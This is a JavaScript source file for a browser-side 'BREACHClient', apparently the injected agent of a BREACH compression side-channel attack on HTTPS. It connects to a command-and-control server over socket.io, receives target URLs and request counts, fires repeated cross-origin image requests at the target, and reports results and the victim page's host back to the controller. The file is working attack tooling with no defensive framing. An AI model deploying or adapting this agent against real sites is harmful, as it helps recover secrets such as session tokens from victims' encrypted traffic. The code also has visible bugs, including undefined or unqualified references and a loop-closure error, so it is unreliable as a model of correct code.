const io = require('socket.io-client');

var BREACHClient = {
    COMMAND_CONTROL_URL: 'http://localhost:3031/',
    ONE_REQUEST_TIMEOUT: 5000,
    MORE_WORK_TIMEOUT: 10000,
    _socket: null,
    init() {
        this._socket = io.connect(this.COMMAND_CONTROL_URL);
        this._socket.on('connect', () => {
            console.log('Connected');
        });
        this._socket.on('do-work', (work) => {
            console.log('do-work message');
            this.doWork(work);
        });
        this.getWork();
        console.log('Initialized');
    },
    noWork() {
        console.log('No work');
        setTimeout(this.getWork, MORE_WORK_TIMEOUT);
    },
    doWork(work) {
        var timeout = work.timeout,
            url = work.url,
            amount = work.amount;

        if (typeof work.url == 'undefined') {
            noWork();
            return;
        }
        console.log('Got work: ', work);

        if (timeout != 0) {
            throw 'Not implemented';
        }
        var loadedCount = 0;
        const reportCompletion = (success) => {
            this._socket.emit('work-completed', {
                work: work,
                success: success,
                host: window.location.host
            }, gotWork);
        }
        const allCompleted = () => {
            reportCompletion(true);
        }
        const reportProblem = () => {
            reportCompletion(false);
        }
        var imgs = [];
        var loadingTimeout;

        const resetTimeout = () => {
            clearTimeout(loadingTimeout);
            loadingTimeout = setTimeout(() => {
                for (var i = 0; i < amount; ++i) {
                    imgs[i].src = '';
                }
                reportProblem();
            }, this.ONE_REQUEST_TIMEOUT);
        }
        const oneLoaded = (imageIndex) => {
            console.log();

            resetTimeout();
            console.log('Loaded image: ' + imageIndex);
            ++loadedCount;

            if (loadedCount == amount) {
                allCompleted();
            }
        }
        for (var i = 0; i < amount; ++i) {
            var img = new Image();
            console.log('Making request to ' + url);
            img.src = url;
            img.onerror = () => {
                oneLoaded(i);
            };
            imgs.push(img);
        }
        resetTimeout();
    },
    getWork() {
        console.log('Getting work');
        this._socket.emit('get-work');
    }
};

BREACHClient.init();
